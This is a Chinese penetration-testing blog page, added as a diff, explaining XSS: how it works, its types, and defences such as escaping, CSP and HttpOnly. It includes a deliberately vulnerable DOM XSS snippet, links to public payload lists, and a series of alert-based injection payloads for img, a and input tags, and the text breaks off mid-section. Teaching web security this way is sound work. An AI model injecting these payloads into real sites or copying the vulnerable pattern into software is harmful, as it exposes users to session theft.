@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>xss漏洞 | Hexo</title>
+  <meta name="description" content="xss原理攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 危害 窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss漏洞">
+<meta property="og:url" content="http://s1eady.top/2018/12/26/xss/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="xss原理攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 危害 窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621144413840.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621153113215.png">
+<meta property="article:published_time" content="2018-12-26T02:46:40.000Z">
+<meta property="article:modified_time" content="2020-10-16T11:57:22.356Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="OWSP-TOP10">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621144413840.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://s1eady.top/2018/12/26/xss/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">果冻</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Penetration Testing</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 中国 南京</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
+        
+        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
+        
+        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>深山夕照深秋雨 一往情深深几许</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#xss"><span class="toc-number">1.</span> <span class="toc-text">xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">4.1.</span> <span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE"><span class="toc-number">4.1.2.</span> <span class="toc-text">常见漏洞位置</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">4.2.</span> <span class="toc-text">存储型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">常见漏洞位置</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">4.3.</span> <span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-number">5.</span> <span class="toc-text">业务逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%80%9D%E8%B7%AF"><span class="toc-number">6.</span> <span class="toc-text">防御思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8xss%E5%92%8C%E5%8F%8D%E5%B0%84xss"><span class="toc-number">6.1.</span> <span class="toc-text">存储xss和反射xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">6.2.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%80%9D%E8%B7%AF"><span class="toc-number">6.3.</span> <span class="toc-text">其他思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">7.</span> <span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">8.</span> <span class="toc-text">绕过思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">8.1.</span> <span class="toc-text">1、过滤关键字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E8%BF%87%E6%BB%A4%E7%AC%A6%E5%8F%B7"><span class="toc-number">8.2.</span> <span class="toc-text">2、过滤符号</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8-%E6%88%96%E8%80%85"><span class="toc-number">8.2.1.</span> <span class="toc-text">用&#x2F;**&#x2F;或者&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">8.3.</span> <span class="toc-text">3、常用函数</span></a></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-xss" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      xss漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/12/26/xss/" class="article-date">
+	  <time datetime="2018-12-26T02:46:40.000Z" itemprop="datePublished">2018-12-26</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/">前端安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/OWSP-TOP10/" rel="tag">OWSP-TOP10</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/12/26/xss/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。</li>
+<li>监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。</li>
+<li>更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。</li>
+</ul>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码</p>
+<h6 id="常见漏洞位置"><a href="#常见漏洞位置" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>网站搜索框、用户登录入口、注入表单的地方。</p>
+<h5 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。</p>
+<h6 id="常见漏洞位置-1"><a href="#常见漏洞位置-1" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>论坛、博客等留言位置、评论位置。</p>
+<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>原理</p>
+<p>DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。</p>
+<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
+<p>当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p>
+<p>攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。</p>
+<p>比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;DOM XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5;</span><br><span class="line">	document.write(decodeURI(document.URL.substring(pos,document.URL.length)));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获取输入函数</p>
+<ul>
+<li>document.URL</li>
+<li>document.URLUnencoded</li>
+<li>document.location（及其许多属性）</li>
+<li>document.referrer</li>
+<li>window.location（及其许多属性）</li>
+<li>location</li>
+<li>location.href</li>
+<li>location.search</li>
+<li>location.hash</li>
+<li>location.pathname</li>
+</ul>
+<p>输出函数</p>
+<ul>
+<li><p>eval(…)</p>
+</li>
+<li><p>window.execScript(…)</p>
+</li>
+<li><p>window.setInterval(…)</p>
+</li>
+<li><p>window.setTimeout(…)</p>
+</li>
+<li><p>document.write(…)</p>
+</li>
+<li><p>document.writeln(…)</p>
+</li>
+<li><p>element.innerHTML(…)</p>
+</li>
+<li><p>document.forms[0].action=… (and various other collections)</p>
+</li>
+<li><p>document.attachEvent(…)</p>
+</li>
+<li><p>document.create…(…)</p>
+</li>
+<li><p>document.execCommand(…)</p>
+</li>
+<li><p>document.body. … (accessing the DOM through the body object)</p>
+</li>
+<li><p>window.attachEvent(…)</p>
+</li>
+<li><p>document.location=… (and assigning to location’s href, host and hostname)</p>
+</li>
+<li><p>document.location.hostname=…</p>
+</li>
+<li><p>document.location.replace(…)</p>
+</li>
+<li><p>document.location.assign(…)</p>
+</li>
+<li><p>document.URL=…</p>
+</li>
+<li><p>window.navigate(…)</p>
+</li>
+<li><p>document.open(…)</p>
+</li>
+<li><p>window.open(…)</p>
+</li>
+<li><p>window.location.href=… (and assigning to location’s href, host and hostname)</p>
+</li>
+</ul>
+<p>总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
+<h4 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框</p>
+<p>2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等</p>
+<p>xss大多出现在输入框中</p>
+<p>3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方</p>
+<h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="存储xss和反射xss"><a href="#存储xss和反射xss" class="headerlink" title="存储xss和反射xss"></a>存储xss和反射xss</h5><p>1、纯前端渲染，把代码和数据分隔开。</p>
+<ul>
+<li><p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</p>
+</li>
+<li><p>然后浏览器执行 HTML 中的 JavaScript。</p>
+</li>
+<li><p>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</p>
+</li>
+</ul>
+<p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p>
+<p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。</p>
+<p>2、直接使用html实体转义函数,比如php函数<code>htmlspecialchars（）</code>和<code>htmlentities()</code>、<code>escapeHTML</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符	转义后的字符</span><br><span class="line">&amp;	   &amp;</span><br><span class="line">&lt;	   &lt;</span><br><span class="line">&gt;	   &gt;</span><br><span class="line">&quot;	   &quot;</span><br><span class="line">&#39;	   &amp;#x27;</span><br><span class="line">&#x2F;	   &#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>不能仅仅靠实体转义函数来防御xss，像<code>javascript:alert(&amp;#x27;XSS&amp;#x27;)</code>这种类型的攻击，实体转义函数就不会对其起作用。</p>
+<p>而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。</p>
+<p>但是我们可以使用<code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>转义后的字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>U+2028</code></td>
+<td><code>\u2028</code></td>
+</tr>
+<tr>
+<td><code>U+2029</code></td>
+<td><code>\u2029</code></td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td><code>\u003c</code></td>
+</tr>
+</tbody></table>
+<p>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。</p>
+<table>
+<thead>
+<tr>
+<th>XSS 安全漏洞</th>
+<th>简单转义是否有防护作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTML 标签文字内容</td>
+<td>有</td>
+</tr>
+<tr>
+<td>HTML 属性值</td>
+<td>有</td>
+</tr>
+<tr>
+<td>CSS 内联样式</td>
+<td>无</td>
+</tr>
+<tr>
+<td>内联 JavaScript</td>
+<td>无</td>
+</tr>
+<tr>
+<td>内联 JSON</td>
+<td>无</td>
+</tr>
+<tr>
+<td>跳转链接</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h5 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h5><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p>
+<p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。</p>
+<h5 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h5><p>1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。</p>
+<p>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</p>
+<p>禁止向第三方域提交数据，这样用户数据也不会外泄；</p>
+<p>2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p>
+<p>3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。<br>4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。</p>
+<p>5、数据插入数据、取出数据库都不转义,在视图文件中进行转义</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment-content&quot;</span>&gt;&lt;?php echo htmlspecialchars($comment[<span class="string">&#x27;content&#x27;</span>];) ?&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。</p>
+<p>2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p>
+<p>3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p>
+<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>1、如果前端限制,尝试burp抓包改包</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># XSS-Payload</span></span><br><span class="line">https:<span class="comment">//github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayload</span></span><br><span class="line">https:<span class="comment">//github.com/ZephrFish/XSSPayloads/blob/master/raw_payloads</span></span><br><span class="line">https:<span class="comment">//github.com/silience/xsspayload</span></span><br><span class="line">https:<span class="comment">//github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txt</span></span><br><span class="line">https:<span class="comment">//github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试</p>
+<p>3、手工测试常见标签</p>
+<p><code>&lt;img&gt;</code>标签</p>
+<p>利用方式1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;a&gt;</code>标签</p>
+<p>标准格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>方式1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>input</code>标签</p>
+<p>标准格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS利用方式1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;form&gt;标签</code></p>
+<p>XSS利用方式1</p>
